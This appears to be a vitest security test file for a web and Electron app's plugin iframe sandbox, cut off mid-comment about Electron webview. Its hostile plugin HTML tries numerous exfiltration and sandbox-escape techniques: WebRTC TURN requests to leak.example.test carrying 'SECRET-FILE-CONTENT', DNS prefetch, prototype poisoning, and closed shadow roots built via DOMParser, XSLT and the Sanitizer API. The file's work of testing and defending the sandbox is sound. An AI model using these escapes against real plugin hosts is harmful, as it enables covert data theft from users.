import { afterEach, beforeAll, describe, expect, it } from "vitest";
// The policy under test, read from the document the app actually ships, so
// deleting it there fails this test instead of leaving it passing on a copy.
import appIndexHtml from "../../public/index.html?raw";
// Same reason: the bridge contract a plugin author reads is part of the control,
// because one half of it is theirs to enforce.
import pluginsDoc from "../../../../docs/plugins.md?raw";
import { createPluginIframe } from "./frame.web";

/**
 * The denial test. A sandboxed iframe is always allowed to navigate *itself*,
 * and nothing in the guest's own CSP stops it — `frame-src 'none'` on the
 * **host** document is what does, because a child frame's navigation is checked
 * against its parent's policy. This mounts a hostile plugin that tries every
 * exfiltration vector and asserts that not one request leaves the page.
 */
const EXFIL_MARKER = "__exfil__";

function hostContentSecurityPolicy(): string {
  const match = appIndexHtml.match(
    /<meta\s+http-equiv="Content-Security-Policy"\s+content="([^"]+)"/i,
  );
  if (!match) {
    throw new Error(
      "packages/app/public/index.html has no Content-Security-Policy meta: the plugin frame can navigate itself out to any origin",
    );
  }
  return match[1];
}

const HOSTILE_PLUGIN_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var violations = [];
      document.addEventListener("securitypolicyviolation", function (event) {
        violations.push(event.effectiveDirective || event.violatedDirective);
      });

      window.addEventListener("message", function (event) {
        var data = event.data;
        if (!data || data.exfil !== 1) return;

        if (data.type === "attack") {
          var target = data.base;
          var outcomes = { windowOpen: "opened" };

          try {
            outcomes.windowOpen = window.open(target + "/open", "_blank") === null ? "blocked" : "opened";
          } catch (error) {
            outcomes.windowOpen = "blocked";
          }

          var form = document.createElement("form");
          form.method = "POST";
          form.action = target + "/form";
          document.body.appendChild(form);
          try { form.submit(); } catch (error) {}

          // A URL the host proves is loadable, so "did not load" can only mean
          // the request was refused.
          var img = document.createElement("img");
          img.onload = function () { outcomes.img = "loaded"; };
          img.onerror = function () { outcomes.img = "blocked"; };
          img.src = data.imageUrl;
          document.body.appendChild(img);

          var nested = document.createElement("iframe");
          nested.src = target + "/frame";
          document.body.appendChild(nested);

          // WebRTC is the channel no CSP directive can express: the plugin picks
          // the ICE server host, port, username and credential, so a TURN
          // Allocate carries whatever it wants to wherever it wants.
          outcomes.rtc = typeof RTCPeerConnection === "undefined" ? "absent" : "present";
          try {
            new RTCPeerConnection({ iceServers: [{ urls: "stun:" + data.rtcHost }] });
            outcomes.rtcConstruct = "constructed";
          } catch (error) {
            outcomes.rtcConstruct = "threw";
          }
          // A fresh realm must not hand the constructor back. Reading
          // contentWindow from here proves nothing: it throws cross-origin
          // whether or not the child has WebRTC. So the child reports from
          // inside its own realm, which is where the attack actually runs.
          var CHILD =
            "<script>parent.parent.postMessage({exfil:1,type:'child'," +
            "tag:'TAG',rtc:typeof RTCPeerConnection},'*');<\\/script>";
          try {
            var realm = document.createElement("iframe");
            realm.srcdoc = CHILD.replace("TAG", "append");
            document.body.appendChild(realm);
          } catch (error) {}


          fetch(target + "/fetch").then(
            function () { outcomes.fetch = "sent"; },
            function () { outcomes.fetch = "blocked"; }
          ).then(function () {
            setTimeout(function () {
              // Read after a turn: the removal is a MutationObserver callback,
              // so it has not run yet at appendChild time.
              outcomes.rtcViaFrame = document.querySelector("iframe") ? "attached" : "removed";
              outcomes.violations = violations;
              window.parent.postMessage({ exfil: 1, type: "report", outcomes: outcomes }, "*");
            }, 250);
          });
          return;
        }

        if (data.type === "ping") {
          window.parent.postMessage({ exfil: 1, type: "pong" }, "*");
          return;
        }

        if (data.type === "navigate") {
          // The one the guest's own CSP cannot stop.
          location.href = data.base + "/navigate?d=" + encodeURIComponent(data.secret);
        }
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Removing child frames is a runtime control, so the interesting attacks are on
 * the remover rather than on the frames. Both of these beat an earlier version.
 *
 * `poison` replaces the DOM methods the sweep uses. Our script runs first, but
 * anything it resolves at mutation time is the plugin's to redefine by then, so
 * the observer fires and quietly does nothing.
 *
 * `docwrite` calls `document.write()` after load, which implies `document.open()`
 * and builds a brand new `documentElement`. An observer bound to that node is
 * left watching something detached.
 *
 * Each child reports `typeof RTCPeerConnection` from its own realm — the only
 * vantage point that proves anything, since the parent's view is decided by the
 * opaque origin rather than by whether the child has WebRTC.
 */
const REMOVER_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "<script>parent.parent.postMessage({exfil:1,type:'child',tag:'TAG'," +
        "rtc:typeof RTCPeerConnection},'*');<\\/script>";

      function plant(tag) {
        var frame = document.createElement("iframe");
        frame.srcdoc = CHILD.replace("TAG", tag);
        document.body.appendChild(frame);
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        try {
          Element.prototype.remove = function () {};
          Element.prototype.matches = function () { return false; };
          Element.prototype.querySelectorAll = function () { return []; };
          Node.prototype.removeChild = function (node) { return node; };
        } catch (error) {}
        try { plant("poison"); } catch (error) {}

        try {
          document.write("<iframe srcdoc=\\"" + CHILD.replace("TAG", "docwrite") + "\\"><\\/iframe>");
          document.close();
        } catch (error) {}
        // After the rewrite the tree is new; plant one more to prove the
        // observer is still armed on the replacement document.
        try { plant("after-rewrite"); } catch (error) {}

        // No frame count here on purpose: querySelectorAll is one of the methods
        // this plugin just poisoned, so counting from inside would report
        // whatever the attacker wants. The children speak for themselves.
        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
        }, 300);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * A shadow root is a second tree that neither of the remover's two tools can
 * see: `querySelectorAll` does not descend through a shadow boundary, and a
 * `MutationObserver` on `document` is never told about mutations inside one.
 * An `<iframe>` in a shadow root still gets a real browsing context, so the
 * plugin gets a fresh realm with `RTCPeerConnection` intact.
 *
 * Three orderings, because the boundary defeats the sweep either way round:
 * building the shadow tree while the host is detached, filling it after the
 * host is attached, and doing it in a `closed` root the host cannot even reach.
 */
const SHADOW_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      // Constructing the connection is the exfiltration: the plugin picks the
      // TURN host and the username, so the Allocate carries its payload out.
      var CHILD = "<script>var ice='no';try{" +
        "var pc=new RTCPeerConnection({iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "pc.createOffer().then(function(d){pc.setLocalDescription(d)});ice='gathering'" +
        "}catch(e){ice='threw'}" +
        "parent.parent.postMessage({exfil:1,type:'child',tag:'TAG'," +
        "rtc:typeof RTCPeerConnection,ice:ice},'*');<\\/script>";

      function frameIn(root, tag) {
        var frame = document.createElement("iframe");
        frame.srcdoc = CHILD.replace("TAG", tag);
        root.appendChild(frame);
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        try {
          var detached = document.createElement("div");
          frameIn(detached.attachShadow({ mode: "open" }), "shadow-detached");
          document.body.appendChild(detached);
        } catch (error) {}

        try {
          var attached = document.createElement("div");
          document.body.appendChild(attached);
          frameIn(attached.attachShadow({ mode: "open" }), "shadow-attached");
        } catch (error) {}

        try {
          var closed = document.createElement("div");
          document.body.appendChild(closed);
          frameIn(closed.attachShadow({ mode: "closed" }), "shadow-closed");
        } catch (error) {}

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
        }, 400);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * The doors to a shadow root the observer can never see into. A closed root
 * built by the HTML parser is unreachable from script afterwards — there is no
 * `shadowRoot` to read and no `attachShadow` call to wrap — so the only defence
 * is that the parser never runs over plugin markup.
 */
const DECLARATIVE_SHADOW_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <div id="dsd">
      <template shadowrootmode="closed">
        <iframe srcdoc="&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection({iceServers:[{urls:'turn:leak.example.test:3478',username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage({exfil:1,type:'child',tag:'declarative',ice:ice},'*');&lt;/script&gt;"></iframe>
      </template>
    </div>
    <script>
      var denied = [];
      function refused(name, run) {
        try { run(); } catch (error) { denied.push(name); }
      }
      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        var HOSTED = "<div><template shadowrootmode='closed'>" +
          "<iframe srcdoc=\\"&lt;script&gt;parent.parent.postMessage({exfil:1,type:'child'," +
          "tag:'TAG',ice:typeof RTCPeerConnection},'*');&lt;/script&gt;\\"><\\/iframe>" +
          "<\\/template><\\/div>";

        refused("write", function () { document.write(HOSTED.replace("TAG", "write")); });
        refused("setHTMLUnsafe", function () {
          document.body.setHTMLUnsafe(HOSTED.replace("TAG", "setHTMLUnsafe"));
        });
        refused("parseHTMLUnsafe", function () {
          document.body.appendChild(
            document.adoptNode(
              Document.parseHTMLUnsafe(HOSTED.replace("TAG", "parseHTMLUnsafe")).body.firstChild,
            ),
          );
        });

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept", denied: denied }, "*");
        }, 400);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Resource hints are a DNS/connection channel CSP does not express.
 * `rel="dns-prefetch"` resolves an attacker-chosen hostname and
 * `rel="preconnect"` also opens the socket, without ever making a request a
 * policy could be consulted for — the payload rides in the subdomain labels,
 * exactly the DNS exfiltration the shell deletes `RTCPeerConnection` to close.
 * A `<link>` is not a browsing context, so the frame sweep never looked at one.
 *
 * A hint fires the moment the element is connected, which is before any
 * observer's microtask, so nothing can be removed in time. What the shell does
 * instead is never connect one: the plugin's markup is sanitised while it is
 * still detached. This asserts that — no `<link>` from plugin markup reaches the
 * document, whatever its `rel`.
 */
const RESOURCE_HINT_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <link rel="dns-prefetch" href="https://dnspf.leak.example.test/">
    <link rel="preconnect" href="https://preconn.leak.example.test/">
    <link rel="stylesheet" href="https://sheet.leak.example.test/x.css">
    <div><link rel="prefetch" href="https://nested.leak.example.test/x"></div>
    <script>
      setTimeout(function () {
        var rels = [];
        var links = document.querySelectorAll("link");
        for (var i = 0; i < links.length; i++) rels.push(links[i].rel);
        window.parent.postMessage({ exfil: 1, type: "hints", rels: rels }, "*");
      }, 200);
    </script>
  </body>
</html>`;

/**
 * The sweep's own machinery, one level up from the DOM methods an earlier round
 * poisoned. `watch()` calls `observer.observe(root, ...)`, and `observe` is
 * resolved off `MutationObserver.prototype` at mutation time — after the
 * plugin's script has run. Replace it with a no-op and every shadow root the
 * wrapped `attachShadow` hands out is swept once and then never watched again,
 * so a frame appended to that root afterwards is invisible: a `MutationObserver`
 * on `document` is never notified of mutations inside a shadow tree.
 *
 * This test FAILS as of 68e6bb13d — the child realm gets `RTCPeerConnection`
 * back and reaches an attacker-chosen TURN host. The fix is to capture
 * `MutationObserver.prototype.observe` up front like every other method the
 * sweep uses, and call it through `Reflect.apply`.
 */
const OBSERVER_POISON_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
        "{exfil:1,type:'child',tag:'TAG',ice:ice},'*');&lt;/script&gt;";

      function plantInto(root, tag) {
        var frame = document.createElement("iframe");
        frame.setAttribute("srcdoc", CHILD.replace("TAG", tag).replace(/&lt;/g, "<").replace(/&gt;/g, ">"));
        root.appendChild(frame);
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        try { MutationObserver.prototype.observe = function () {}; } catch (error) {}

        // Closed: the wrapper is the only thing that ever sees this root, and it
        // just lost the ability to watch it.
        try {
          var closedHost = document.createElement("div");
          document.body.appendChild(closedHost);
          var closedRoot = closedHost.attachShadow({ mode: "closed" });
          plantInto(closedRoot, "poisoned-observe");
        } catch (error) {}

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
        }, 600);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 8 poisoned `observe` itself. This one leaves `observe` alone and
 * poisons what it *reads*.
 *
 * `watch()` calls `A(startWatching, observer, [root, WATCH])` with `WATCH` — a
 * plain object literal built at init, so its prototype is `Object.prototype`.
 * `observe` converts it to a `MutationObserverInit` dictionary, and WebIDL
 * dictionary conversion is a `Get` per member: every member `WATCH` does not
 * own is read off `Object.prototype`, which the plugin owns. `attributeFilter`
 * is a `sequence<DOMString>`, so a non-iterable value there makes the
 * conversion throw a `TypeError` before `observe` does anything.
 *
 * Capturing the method did not help: it is the *argument* that is late-bound.
 * `watch()` then throws before it reaches `sweep(root)`, so the root is both
 * unwatched and unswept — and `follow()` inside the sweep throws for the same
 * reason on every later attempt, so the belt-and-braces open-root scan cannot
 * recover it either.
 *
 * Both orderings: attach the root to an already-connected host so no document
 * mutation ever names it again, and attach it to a detached host so the
 * document-level sweep gets its turn and dies in `follow()`.
 *
 * This test FAILS as of fb954accd — both children report
 * `RTCPeerConnection` back and reach an attacker-chosen TURN host with the
 * payload in the ICE username. The fix is for the shell to build every object
 * it hands to a web API with `Object.create(null)`, so no dictionary member it
 * leaves unset is read off a prototype the plugin owns: `WATCH` here, and the
 * `attachShadow` init object next to it (`Object.prototype.clonable = true`
 * there yields a shadow root from `cloneNode` with no `attachShadow` call
 * anywhere). Capturing the callee is not enough when the argument is late-bound.
 */
const OBSERVER_INIT_POISON_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
        "{exfil:1,type:'child',tag:'TAG',ice:ice},'*');&lt;/script&gt;";

      function plantInto(root, tag) {
        var frame = document.createElement("iframe");
        frame.setAttribute("srcdoc", CHILD.replace("TAG", tag).replace(/&lt;/g, "<").replace(/&gt;/g, ">"));
        root.appendChild(frame);
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        // Not a member of the shell's WATCH object, so it is read off
        // Object.prototype. A non-iterable makes sequence<DOMString> throw.
        try { Object.prototype.attributeFilter = 1; } catch (error) {}

        // Host already connected: after attachShadow throws, nothing the plugin
        // does inside the root is ever a document mutation.
        try {
          var connected = document.createElement("div");
          document.body.appendChild(connected);
          try { connected.attachShadow({ mode: "closed" }); } catch (error) {}
          plantInto(connected.shadowRoot, "init-poison-connected");
        } catch (error) {}

        // Host detached: the document sweep does see it, and dies in follow().
        try {
          var detached = document.createElement("div");
          try { detached.attachShadow({ mode: "closed" }); } catch (error) {}
          plantInto(detached.shadowRoot, "init-poison-detached");
          document.body.appendChild(detached);
        } catch (error) {}

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
        }, 600);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 10, and the same class as rounds 8 and 9: the shell calls something it
 * did not capture. `bare()` resolves `Object.create` when it is *called*, and the
 * `attachShadow` wrapper calls it on every `attachShadow` — long after the
 * plugin's script has run. So the null-prototype object the wrapper hands the
 * real `attachShadow` is whatever the plugin's `Object.create` returns.
 *
 * A `mode` accessor that swallows the wrapper's `options.mode = "open"` and
 * reports `"closed"` defeats the one thing the wrapper exists to force. The
 * wrapper still watches the root it gets back, so the frame cannot go in there
 * directly — but `clonable: true` is a member the wrapper copies across, and
 * `cloneNode` mints a second *closed* root that no `attachShadow` call ever saw.
 * `follow()` reads `element.shadowRoot`, which is null for a closed root, so the
 * clone is invisible to every sweep and the frame inside it loads.
 */
const BARE_POISON_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "<script>var ice='no';try{" +
        "var pc=new RTCPeerConnection({iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}" +
        "parent.parent.postMessage({exfil:1,type:'child',tag:'TAG'," +
        "rtc:typeof RTCPeerConnection,ice:ice},'*');<\\/script>";

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        var note = "no";
        try {
          // The shell's \`bare()\` is \`function(){ return Object.create(null); }\`,
          // resolved at call time. Own it.
          Object.create = function () {
            return {
              get mode() { return "closed"; },
              set mode(value) {},
              get clonable() { return true; },
              set clonable(value) {},
            };
          };

          // Detached, so nothing here is ever a document mutation and the frame
          // does not load until the clone is connected.
          var host = document.createElement("div");
          // \`clonable\` is an accessor pair too, so the wrapper's
          // \`options.clonable = init.clonable\` cannot clear it back to undefined.
          var root = host.attachShadow({ mode: "closed" });
          note = host.shadowRoot === null ? "closed" : "open";

          var frame = document.createElement("iframe");
          frame.srcdoc = CHILD.replace("TAG", "bare-poison");
          root.appendChild(frame);

          // Synchronous: the wrapper's observer removes the frame from \`root\` in
          // a microtask, and this runs before that. The clone keeps its copy in a
          // closed root nothing is watching.
          var clone = host.cloneNode(true);
          document.body.appendChild(clone);
        } catch (error) {
          note = "threw:" + (error && error.message);
        }

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept", note: note }, "*");
        }, 600);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 11. The shell denies every *unsafe-named* door to a declarative shadow
 * root — `document.write`, `Element.setHTMLUnsafe`, `ShadowRoot.setHTMLUnsafe`,
 * `Document.parseHTMLUnsafe` — and relies on fragment parsing leaving
 * `<template shadowrootmode>` inert everywhere else.
 *
 * `DOMParser.parseFromString(html, "text/html")` is not a fragment parse. It is
 * a full document parse, and the HTML spec sets "allow declarative shadow roots"
 * for it, precisely because the document it returns is inert and therefore not
 * an injection sink on its own. It is not denied by the shell.
 *
 * Inert only lasts until the node moves. `document.adoptNode` *moves* the host
 * element into the live document — it is not a clone, so `clonable` never comes
 * into it — and the closed shadow root travels with it. Appending it connects
 * the `<iframe>` inside that root to a browsing context.
 *
 * Nothing downstream can see it. The `MutationObserver` on `document` is never
 * told about the inside of a shadow tree, `querySelectorAll` does not cross the
 * boundary, `follow()` reads `element.shadowRoot` which is `null` for a closed
 * root, and no `attachShadow` call ever happened for the wrapper to intercept.
 * The child realm loads with `RTCPeerConnection` intact and reaches an
 * attacker-chosen TURN host with the payload in the ICE username.
 *
 * `importNode` is included as the second ordering: same parse, a copy rather
 * than a move.
 */
const DOMPARSER_SHADOW_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
        "{exfil:1,type:'child',tag:'TAG',rtc:typeof RTCPeerConnection,ice:ice},'*');&lt;/script&gt;";

      function markup(tag) {
        return "<div id='dsdhost'><template shadowrootmode='closed'>" +
          "<iframe srcdoc=\\"" + CHILD.replace("TAG", tag) + "\\"></iframe>" +
          "</template></div>";
      }

      function describe(host) {
        if (!host) return "nohost";
        // A DSD-aware parse consumes the <template> and leaves a closed root, so
        // the host has no children and no readable shadowRoot.
        return "kids=" + host.childNodes.length + ";shadow=" + (host.shadowRoot ? "open" : "none");
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        var notes = [];

        try {
          var moved = new DOMParser().parseFromString(markup("domparser-adopt"), "text/html");
          var movedHost = moved.getElementById("dsdhost");
          notes.push("adopt:" + describe(movedHost));
          document.body.appendChild(document.adoptNode(movedHost));
        } catch (error) {
          notes.push("adopt:threw:" + (error && error.message));
        }

        try {
          var copied = new DOMParser().parseFromString(markup("domparser-import"), "text/html");
          var copiedHost = copied.getElementById("dsdhost");
          notes.push("import:" + describe(copiedHost));
          document.body.appendChild(document.importNode(copiedHost, true));
        } catch (error) {
          notes.push("import:threw:" + (error && error.message));
        }

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept", note: notes.join(" ") }, "*");
        }, 600);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 12. The same closed-shadow-root escape as `DOMPARSER_SHADOW_ATTACK_HTML`,
 * through the one same-realm HTML *document* parser nothing denies:
 * `XSLTProcessor.transformToDocument`.
 *
 * `document.write`, `document.writeln`, `Document.parseHTMLUnsafe`,
 * `Element.setHTMLUnsafe` and `ShadowRoot.setHTMLUnsafe` are locked in
 * `KILL_CHILD_REALMS`, and `DOMParser.parseFromString` was measured not to honour
 * declarative shadow DOM. `XSLTProcessor` is in none of those lists. With
 * `<xsl:output method="html"/>` Chromium builds the result tree through the HTML
 * document parser with declarative shadow roots enabled, so
 * `<template shadowrootmode="closed">` is consumed and becomes a real closed root
 * on a document in this realm. No `attachShadow` call happens, so the wrapper
 * never sees it and never forces `open`.
 *
 * `document.adoptNode` then *moves* the host into the live document; the closed
 * root travels with it. `follow()` reads `element.shadowRoot`, which is `null`,
 * the `MutationObserver` is never told about the inside of a shadow tree, and
 * `querySelectorAll` does not cross the boundary — so the `<iframe>` in there
 * connects to a browsing context that nothing in the shell can see, in a fresh
 * realm with `RTCPeerConnection` intact.
 *
 * `xsl:attribute` rather than a literal `srcdoc="..."`: a literal attribute value
 * in XSLT is an attribute value template, and the `{` of the ICE server
 * dictionary would be parsed as an expression.
 */
const XSLT_SHADOW_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
        "{exfil:1,type:'child',tag:'xslt-adopt',rtc:typeof RTCPeerConnection,ice:ice},'*');&lt;/script&gt;";

      var XSL =
        '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
        '<xsl:output method="html"/>' +
        '<xsl:template match="/"><div id="dsdhost">' +
        '<template shadowrootmode="closed">' +
        '<iframe><xsl:attribute name="srcdoc">' + CHILD + '</xsl:attribute></iframe>' +
        '</template></div></xsl:template></xsl:stylesheet>';

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        var notes = [];
        try {
          var processor = new XSLTProcessor();
          processor.importStylesheet(new DOMParser().parseFromString(XSL, "text/xml"));
          var out = processor.transformToDocument(new DOMParser().parseFromString("<a/>", "text/xml"));
          var host = out && out.getElementById ? out.getElementById("dsdhost") : null;
          if (!host) {
            notes.push("nohost");
          } else {
            // A DSD-aware parse consumes the <template> and leaves a closed root,
            // so the host has no children and no readable shadowRoot.
            notes.push("kids=" + host.childNodes.length +
              ";template=" + (host.querySelector("template") ? "kept" : "consumed") +
              ";shadow=" + (host.shadowRoot ? "open" : "none"));
            document.body.appendChild(document.adoptNode(host));
          }
        } catch (error) {
          notes.push("threw:" + (error && error.message));
        }

        setTimeout(function () {
          notes.push("hostConnected=" + document.querySelectorAll("#dsdhost").length);
          window.parent.postMessage({ exfil: 1, type: "swept", note: notes.join(" ") }, "*");
        }, 700);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 13. The same closed-shadow-root escape again, through the two HTML
 * *document* parser entry points the Sanitizer API added and nothing locks:
 * `Element.prototype.setHTML` / `ShadowRoot.prototype.setHTML` and the static
 * `Document.parseHTML`.
 *
 * `KILL_CHILD_REALMS` denies `document.write`, `writeln`, `Document.parseHTMLUnsafe`,
 * `Element/ShadowRoot.setHTMLUnsafe` and both `XSLTProcessor` transforms. The
 * *safe* halves of the same API pair are not in that list, and the Sanitizer spec
 * parses with declarative shadow roots enabled for both — the sanitiser then runs
 * over the result. Whether a closed root and an `<iframe srcdoc>` survive that
 * sanitisation is the whole question, and it is measured here rather than
 * reasoned about.
 */
const SANITIZER_SHADOW_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
        "{exfil:1,type:'child',tag:'TAG',rtc:typeof RTCPeerConnection,ice:ice},'*');&lt;/script&gt;";

      // The same child, for the \`srcdoc\` *property* rather than an attribute the
      // HTML parser decodes on the way in.
      var RAW_CHILD = "<script>var ice='no';try{var pc=new RTCPeerConnection(" +
        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
        "{exfil:1,type:'child',tag:'TAG',rtc:typeof RTCPeerConnection,ice:ice},'*');<\\/script>";

      function markup(tag) {
        return "<div id='sanhost'><template shadowrootmode='closed'>" +
          "<iframe srcdoc=\\"" + CHILD.replace("TAG", tag) + "\\"></iframe>" +
          "</template></div>";
      }

      function describe(host) {
        if (!host) return "nohost";
        // A DSD-aware parse consumes the <template> and leaves a closed root, so
        // the host has no children and no readable shadowRoot.
        return "kids=" + host.childNodes.length + ";shadow=" + (host.shadowRoot ? "open" : "none");
      }

      // A defined custom element, because \`ElementInternals.shadowRoot\` is the
      // way back into a *declarative* closed root: a root the HTML parser makes
      // has "available to element internals" set, unlike one from attachShadow.
      try {
        customElements.define("x-host", class extends HTMLElement {});
      } catch (error) {}

      // Nothing dangerous inside the template, so the safe sanitiser has no
      // reason to strip it. The frame goes in afterwards, through internals.
      var HOST = "<x-host id='sanhost'><template shadowrootmode='closed'>" +
        "<span id='inner'></span></template></x-host>";
      var CONFIG = {
        sanitizer: {
          elements: ["div", "span", "template", "iframe", "x-host"],
          attributes: ["id", "srcdoc", "shadowrootmode"]
        }
      };

      function reach(host, tag, notes) {
        if (!host) { notes.push(tag + ":nohost"); return; }
        notes.push(tag + ":" + describe(host));
        var root = null;
        try { root = host.attachInternals().shadowRoot; } catch (error) {
          notes.push(tag + ":internals:threw:" + (error && error.name));
        }
        notes.push(tag + ":internalsRoot=" + (root ? root.mode : "null"));
        if (!root) return;
        // A frame inserted into a closed root: no MutationObserver on the
        // document is told, and querySelectorAll does not cross the boundary.
        try {
          var frame = document.createElement("iframe");
          frame.srcdoc = RAW_CHILD.replace("TAG", tag);
          root.appendChild(frame);
        } catch (error) {
          notes.push(tag + ":plant:threw:" + (error && error.name));
        }
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        var notes = ["api:setHTML=" + typeof Element.prototype.setHTML +
          ";parseHTML=" + typeof Document.parseHTML +
          ";docSetHTMLUnsafe=" + typeof Document.prototype.setHTMLUnsafe];

        // 1. The safe setter on a live element, default sanitiser, frame in the
        //    markup — the direct form.
        try {
          var live = document.createElement("div");
          document.body.appendChild(live);
          live.setHTML(markup("setHTML-default"));
          notes.push("setHTML:" + describe(live.querySelector("#sanhost")));
        } catch (error) {
          notes.push("setHTML:threw:" + (error && error.name));
        }

        // 2. The safe setter with a config that names what the attack needs,
        //    and a template the sanitiser has no reason to touch.
        try {
          var wide = document.createElement("div");
          document.body.appendChild(wide);
          wide.setHTML(HOST, CONFIG);
          reach(wide.querySelector("#sanhost"), "setHTMLWide", notes);
        } catch (error) {
          notes.push("setHTMLWide:threw:" + (error && error.name));
        }

        // 3. The static document parser, then adopt the host across.
        try {
          var parsed = Document.parseHTML(HOST, CONFIG);
          var host = parsed.getElementById("sanhost");
          if (host) document.body.appendChild(document.adoptNode(host));
          reach(host, "parseHTML", notes);
        } catch (error) {
          notes.push("parseHTML:threw:" + (error && error.name));
        }

        setTimeout(function () {
          notes.push("hostsConnected=" + document.querySelectorAll("#sanhost").length);
          notes.push("framesConnected=" + document.querySelectorAll("iframe").length);
          window.parent.postMessage({ exfil: 1, type: "swept", note: notes.join(" ") }, "*");
        }, 700);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 11. `SELECTOR` in `KILL_CHILD_REALMS` and the markup sanitiser in
 * `INSERT_PLUGIN_HTML` both enumerate the elements that can become a browsing
 * context as `iframe,frame,object,embed,link`. On the Electron desktop build
 * that list is short by one: `<webview>`.
 *
 * The main window is created with `webviewTag: true`
 * (`packages/desktop/src/main.ts:714`), which registers the `<webview>` custom
 * element in the renderer. A `<webview>` guest is a separate `WebContents` with
 * its own session — the parent document's CSP never applies to it, `frame-src`
 * and `object-src` do not describe it, and the iframe `sandbox` flags are not
 * inherited by it. It is exactly the fresh realm the whole shell exists to deny,
 * with a network stack attached.
 *
 * The one gate is `will-attach-webview`
 * (`packages/desktop/src/main.ts:748`), and it is not a destination gate:
